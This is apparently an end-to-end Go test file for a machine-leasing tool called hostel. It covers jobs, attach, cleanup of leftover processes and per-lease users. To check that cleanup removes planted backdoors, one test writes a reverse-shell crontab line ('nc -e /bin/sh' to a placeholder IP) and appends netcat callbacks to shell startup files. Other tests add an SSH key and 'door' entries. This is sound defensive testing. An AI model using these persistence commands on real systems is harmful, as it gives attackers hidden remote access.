//go:build e2e

package e2e

import (
	"regexp"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/csansoon/hostel/internal/protocol"
)

var jobIDRE = regexp.MustCompile(`job (j-[0-9]+-[0-9a-f]+)`)

func jobID(t *testing.T, r result) string {
	t.Helper()
	m := jobIDRE.FindStringSubmatch(r.stderr)
	if m == nil {
		t.Fatalf("no job ID: %s", r)
	}
	return m[1]
}

// TestJobs is scenario 13.
func TestJobs(t *testing.T) {
	t.Parallel()
	f := newFixture(t, nil)
	f.acquire()

	// run --wait ends before the job: exit code 75 and the attach line; a later
	// attach continues from the offset.
	// The job runs 20 s, a wide margin for the two short waits below.
	r := f.e.hostel("run", "--wait", "5s", "--", "echo first; sleep 20; echo second")
	if r.code != 75 || r.stdout != "first\n" || !strings.Contains(r.stderr, "is still running; run \"hostel attach") {
		t.Fatalf("run with a short wait: %s", r)
	}
	id := jobID(t, r)
	r = f.e.hostel("attach", id, "--wait", "1s")
	if r.code != 75 || r.stdout != "" {
		t.Fatalf("attach while the job runs: %s", r)
	}
	r = f.e.mustHostel("attach", id)
	if r.stdout != "second\n" || !strings.HasSuffix(strings.TrimSpace(r.stderr), "job "+id+" exited with code 0") {
		t.Fatalf("attach after the job: %s", r)
	}

	// A job that exits with 75 gives the "exited with code 75" line.
	r = f.e.hostel("run", "--", "exit 75")
	if r.code != 75 || !strings.HasSuffix(strings.TrimSpace(r.stderr), "exited with code 75") {
		t.Fatalf("job with exit code 75: %s", r)
	}

	// Trailer bytes in the job output are output, not the exit status.
	fake := `printf 'a\0hostel-exit 0\nb\n'; printf '\0hostel-lost\n'; printf '\0hostel-exit 0\n'; exit 3`
	r = f.e.hostel("run", "--", fake)
	if r.code != 3 || r.stdout != "a\x00hostel-exit 0\nb\n\x00hostel-lost\n\x00hostel-exit 0\n" {
		t.Fatalf("job output with trailer bytes: %s", r)
	}

	// A job survives a dropped connection: the server restarts during the run.
	var wg sync.WaitGroup
	var long result
	wg.Add(1)
	go func() {
		defer wg.Done()
		long = f.e.hostel("run", "--wait", "3m", "--", "echo before; until [ -f go ]; do sleep 0.2; done; echo after")
	}()
	// The job waits for the test: under load, one "hostel jobs" can take longer
	// than a job of fixed length.
	f.e.waitFor("job started", machineReady, func() bool {
		return strings.Contains(f.e.hostel("jobs").stdout, "running")
	})
	f.s = f.s.restart()
	f.work("touch go")
	wg.Wait()
	if long.code != 0 || long.stdout != "before\nafter\n" {
		t.Fatalf("job across a server restart: %s", long)
	}

	// A killed supervisor gives "lost".
	r = f.e.hostel("run", "--detach", "--", "sleep 300")
	id = strings.TrimSpace(r.stdout)
	f.c.sh("kill -9 $(sed 's/.*\"supervisor_pid\":\\([0-9]*\\).*/\\1/' /home/hostel/hostel/rooms/a/jobs/" + id + "/supervisor.json)")
	r = f.e.hostel("attach", id)
	if r.code != 1 || !strings.Contains(r.stderr, "job "+id+" was lost") {
		t.Fatalf("attach to a lost job: %s", r)
	}
	if r := f.e.mustHostel("jobs"); !strings.Contains(r.stdout, id+"  lost") {
		t.Fatalf("jobs: %s", r)
	}
}

// TestCleanup is scenario 16.
func TestCleanup(t *testing.T) {
	t.Parallel()
	f := newFixture(t, nil)
	f.acquire()
	base := f.c.sh("cat /home/hostel/.ssh/authorized_keys")
	f.e.mustHostel("run", "--", "setsid sleep 1000 > /dev/null 2>&1 < /dev/null &")
	f.e.mustHostel("run", "--detach", "--", "nc -l 127.0.0.1 7501")
	// Without HOSTEL_LEASE in their environment (as on macOS, where ps -E
	// does not show it for system binaries), cleanup finds these processes by
	// their session: one from a job, one from a guest SSH command.
	f.e.mustHostel("run", "--", "nohup env -u HOSTEL_LEASE sleep 1001 > /dev/null 2>&1 < /dev/null &")
	f.e.mustHostel("ssh", "--", "env -u HOSTEL_LEASE sleep 1002 > /dev/null 2>&1 < /dev/null &")
	// A daemon that starts a child in a new session (as agent-device does with
	// its iOS runner): cleanup finds the child as a descendant of the daemon.
	f.e.mustHostel("run", "--", "nohup env -u HOSTEL_LEASE sh -c 'setsid sleep 1003 & wait' > /dev/null 2>&1 < /dev/null &")
	// The same, but the daemon ends before cleanup: a later guest command
	// recorded the child's session while the daemon ran.
	f.e.mustHostel("run", "--", "nohup env -u HOSTEL_LEASE sh -c 'setsid sleep 1004 & while [ ! -e stop-daemon ]; do sleep 0.2; done' > /dev/null 2>&1 < /dev/null &")
	f.e.mustHostel("run", "--", "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGuestAddedKeyGuestAddedKeyGuestAddedK guest' >> ~/.ssh/authorized_keys")
	if got := f.c.sh("grep -c guest /home/hostel/.ssh/authorized_keys"); got != "1" {
		t.Fatalf("the guest key was not added: %s", got)
	}
	procs := "for p in /proc/[0-9]*; do tr '\\0' ' ' < $p/cmdline 2>/dev/null; echo; done | grep -c -e '^sleep 100[0-4]' -e '^nc -l' || true"
	f.e.waitFor("6 lease processes before release", time.Minute, func() bool { return f.c.sh(procs) == "6" })
	f.e.mustHostel("run", "--", "touch stop-daemon")
	daemon := "for p in /proc/[0-9]*; do tr '\\0' ' ' < $p/cmdline 2>/dev/null; echo; done | grep -c '^sh -c setsid sleep 1004' || true"
	f.e.waitFor("the daemon ended", time.Minute, func() bool { return f.c.sh(daemon) == "0" })
	f.e.mustHostel("release")
	f.waitRoomFree()
	if got := f.c.sh(procs); got != "0" {
		t.Fatalf("lease processes after cleanup: %s", got)
	}
	if got := f.c.sh("cat /home/hostel/.ssh/authorized_keys"); got != base {
		t.Fatalf("authorized_keys after cleanup:\n%s\nwant:\n%s", got, base)
	}
	if got := f.c.sh("nc -z 127.0.0.1 7501 && echo open || echo free"); got != "free" {
		t.Fatalf("port 7501 after cleanup: %s", got)
	}
}

// TestCleanupKeepsOtherRoom: on a machine with two rooms, the cleanup of one lease
// does not stop the processes of the other lease, also those that it finds
// only by session or as a descendant.
func TestCleanupKeepsOtherRoom(t *testing.T) {
	t.Parallel()
	f := newFixture(t, &fixtureOpts{templateKeys: "rooms = [{ name = \"a\" }, { name = \"b\" }]\n"})
	start := func(n string) {
		f.e.mustHostel("run", "--", "nohup env -u HOSTEL_LEASE sleep 20"+n+"0 > /dev/null 2>&1 < /dev/null &")
		f.e.mustHostel("run", "--", "nohup env -u HOSTEL_LEASE sh -c 'setsid sleep 20"+n+"1 & wait' > /dev/null 2>&1 < /dev/null &")
	}
	count := func(n string) string {
		return f.c.sh("for p in /proc/[0-9]*; do tr '\\0' ' ' < $p/cmdline 2>/dev/null; echo; done | grep -c '^sleep 20" + n + "[01]' || true")
	}
	f.acquire()
	start("1")
	f.e.newRepoNamed("second", defaultRepoFiles())
	f.acquire()
	start("2")
	f.e.waitFor("the processes of both leases", time.Minute, func() bool { return count("1") == "2" && count("2") == "2" })
	f.useRepo("repo")
	f.e.mustHostel("release")
	f.e.waitFor("the first lease's processes stopped", time.Minute, func() bool { return count("1") == "0" })
	f.e.waitFor("one room free", time.Minute, func() bool {
		free := 0
		for _, sl := range f.s.machine("home/box").Rooms {
			if sl.State == protocol.RoomFree && sl.LeaseID == "" {
				free++
			}
		}
		return free == 1
	})
	if got := count("2"); got != "2" {
		t.Fatalf("processes of the second lease after the first cleanup: %s, want 2", got)
	}
	f.useRepo("second")
	f.e.mustHostel("release")
	f.e.waitFor("the second lease's processes stopped", time.Minute, func() bool { return count("2") == "0" })
}

// TestJobCommandNotFound: a job whose command is not in the job PATH ends with
// exit code 127 and a clear message (the supervisor writes no
// supervisor.json then; found in M6).
func TestJobCommandNotFound(t *testing.T) {
	t.Parallel()
	f := newFixture(t, nil)
	f.acquire()
	r := f.e.hostel("run", "--", "no-such-command-hostel", "x")
	if r.code != 127 || !strings.Contains(r.stdout+r.stderr, "no-such-command-hostel: command not found in the job PATH") {
		t.Fatalf("job with a missing command: %s", r)
	}
}

// TestCleanupPersistence (M11): cleanup restores the persistence locations of
// the machine user (a crontab entry, a systemd user unit, a changed shell
// startup file, ~/.ssh/rc) and names them in the event log.
func TestCleanupPersistence(t *testing.T) {
	t.Parallel()
	f := newFixture(t, nil)
	f.c.sh("echo '# base' | crontab -u hostel -")
	// A startup file that is a link (a dotfile manager): its target counts.
	f.c.sh("mkdir -p ~/dotfiles && echo '# zsh' > ~/dotfiles/zshrc && ln -s dotfiles/zshrc ~/.zshrc")
	// A linked directory with a link inside: the inner target counts too.
	f.c.sh("mkdir -p ~/dotfiles/fish ~/.config && echo '# fish' > ~/dotfiles/fish.conf && ln -s ../fish.conf ~/dotfiles/fish/config.fish && ln -s ../dotfiles/fish ~/.config/fish")
	bashrc := f.c.sh("cat /home/hostel/.bashrc")
	lease := f.acquire()
	f.e.mustHostel("run", "--", `echo '* * * * * nc -e /bin/sh 192.0.2.1 4444' | crontab - && `+
		`mkdir -p ~/.config/systemd/user && printf '[Service]\nExecStart=/bin/sleep 1000\n' > ~/.config/systemd/user/door.service && `+
		`echo 'nc 192.0.2.1 4444 &' >> ~/.bashrc && echo 'true door' > ~/.ssh/rc && chmod 000 ~/.config/systemd/user && echo 'nc 192.0.2.1 4444 &' >> ~/.zshrc && echo 'nc 192.0.2.1 4444 &' >> ~/.config/fish/config.fish`)
	f.e.mustHostel("release")
	f.waitRoomFree()
	if got := f.c.sh("crontab -l -u hostel 2>&1 || true"); got != "# base" {
		t.Fatalf("crontab after cleanup: %s", got)
	}
	if got := f.c.sh("ls -a /home/hostel/.config/systemd/user /home/hostel/.ssh/rc 2>&1 || true"); strings.Contains(got, "door") || !strings.Contains(got, "No such file") {
		t.Fatalf("unit and ~/.ssh/rc after cleanup: %s", got)
	}
	if got := f.c.sh("cat /home/hostel/.bashrc"); got != bashrc {
		t.Fatalf(".bashrc after cleanup: changed")
	}
	if got := f.c.sh("cat ~/dotfiles/fish.conf"); got != "# fish" {
		t.Fatalf("the target of the link in a linked directory after cleanup: %q", got)
	}
	if got := f.c.sh("readlink ~/.zshrc; cat ~/dotfiles/zshrc"); got != "dotfiles/zshrc\n# zsh" {
		t.Fatalf("the linked .zshrc after cleanup: %q", got)
	}
	var d protocol.MachineDetails
	if code := f.s.get("/v1/machines/home/box", f.s.token, &d); code != 200 {
		t.Fatalf("GET /v1/machines/home/box: HTTP %d", code)
	}
	want := "removed persistence of the lease: /home/hostel/dotfiles/fish.conf, /home/hostel/dotfiles/zshrc, crontab, ~/.bashrc, ~/.config/systemd/user, ~/.ssh/rc"
	if !slices.ContainsFunc(d.Events, func(e protocol.Event) bool { return e.LeaseID == lease && e.Message == want }) {
		t.Fatalf("events without %q: %+v", want, d.Events)
	}
	// The units are not started: the machine container has no user manager.
	// The next lease starts with the restored state.
	f.acquire()
	if r := f.e.mustHostel("run", "--", "crontab -l 2>&1; ls -R ~/.config/systemd 2>&1"); strings.Contains(r.stdout, "192.0.2.1") || strings.Contains(r.stdout, "door") {
		t.Fatalf("the next lease sees the persistence: %s", r.stdout)
	}
}

// TestLeaseUsers (M11): on a machine with lease_users, a lease runs as its own
// OS user, which cannot change the machine's shared cache or read the machine
// user's rooms. Its backdoors (a process without HOSTEL_LEASE in a new session,
// a crontab entry, a file in /tmp) do not survive the release: the user goes.
func TestLeaseUsers(t *testing.T) {
	t.Parallel()
	// fake-screen writes into the machine's cache: a tool like that needs the
	// machine user. fake-sdk does not.
	f := newFixture(t, &fixtureOpts{leaseUsers: true, templateTools: []string{"fake-sdk"}})
	f.c.sh("mkdir -p ~/hostel/cache/shared && echo original > ~/hostel/cache/shared/tool && chmod 666 ~/hostel/cache/shared/tool")
	// An installer with a strict umask: the lease user can read it all the same.
	f.c.sh("mkdir -m 700 ~/hostel/cache/strict && (umask 077 && echo strict > ~/hostel/cache/strict/f)")
	lease := f.acquire("fake-sdk")
	user := "hostel-" + lease[:12]
	if r := f.e.mustHostel("run", "--", "id -un; echo $HOME"); r.stdout != user+"\n/home/"+user+"\n" {
		t.Fatalf("user and home of the lease: %q", r.stdout)
	}
	if r := f.e.mustHostel("run", "--", "cat ~/hostel/cache/strict/f"); r.stdout != "strict\n" {
		t.Fatalf("a strict cache entry for the lease user: %q", r.stdout)
	}
	if r := f.e.mustHostel("run", "--", "cat ~/hostel/cache/shared/tool; (echo changed > ~/hostel/cache/shared/tool) 2>/dev/null || echo refused; "+
		"ls /home/hostel/hostel/rooms >/dev/null 2>&1 || echo hidden"); r.stdout != "original\nrefused\nhidden\n" {
		t.Fatalf("shared cache and machine rooms seen by the lease user: %q", r.stdout)
	}
	f.e.mustHostel("run", "--", "nohup env -i setsid sleep 1005 > /dev/null 2>&1 < /dev/null & "+
		"echo '* * * * * true door' | crontab - && touch /tmp/door-$(id -un) && "+
		"mkdir -p /tmp/locked/inner && touch /tmp/locked/inner/f && chmod 000 /tmp/locked")
	procs := "for p in /proc/[0-9]*; do tr '\\0' ' ' < $p/cmdline 2>/dev/null; echo; done | grep -c '^sleep 1005' || true"
	f.e.waitFor("the backdoor process runs", time.Minute, func() bool { return f.c.sh(procs) == "1" })
	// The lease user breaks its helper and its login: cleanup still deletes it.
	// (A detached job: the guest's own command could not report its end.)
	f.e.mustHostel("run", "--detach", "--", "sleep 1; echo broken > ~/hostel/bin/hostel; rm ~/.ssh/authorized_keys")
	f.e.waitFor("the lease user broke its login", time.Minute, func() bool {
		return f.c.rootSh("test -e /home/"+user+"/.ssh/authorized_keys && echo yes || echo no") == "no"
	})
	f.e.mustHostel("release")
	f.waitRoomFree()
	if got := f.c.rootSh("id " + user + " >/dev/null 2>&1 && echo exists; ls /home; ls /tmp; ls /var/spool/cron/crontabs; " + procs); got != "hostel\n0" {
		t.Fatalf("after the release (user, homes, /tmp, crontabs, processes):\n%s", got)
	}
	if got := f.c.sh("cat ~/hostel/cache/shared/tool"); got != "original" {
		t.Fatalf("shared cache after the lease: %q", got)
	}
	// The next lease gets a new user.
	next := f.acquire("fake-sdk")
	if r := f.e.mustHostel("run", "--", "id -un"); r.stdout != "hostel-"+next[:12]+"\n" {
		t.Fatalf("user of the next lease: %q", r.stdout)
	}
}
